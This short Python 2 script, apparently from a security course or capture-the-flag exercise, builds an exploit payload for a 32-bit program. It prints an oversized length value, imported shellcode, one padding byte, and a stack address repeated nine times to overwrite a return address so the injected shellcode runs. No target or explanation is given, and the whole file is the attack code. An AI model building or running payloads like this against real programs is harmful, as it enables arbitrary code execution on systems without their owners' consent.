from shellcode import shellcode
from struct import pack

print pack("<I", 0x7fffffff) + shellcode + "a" + pack("<I", 0xbffeff10)*9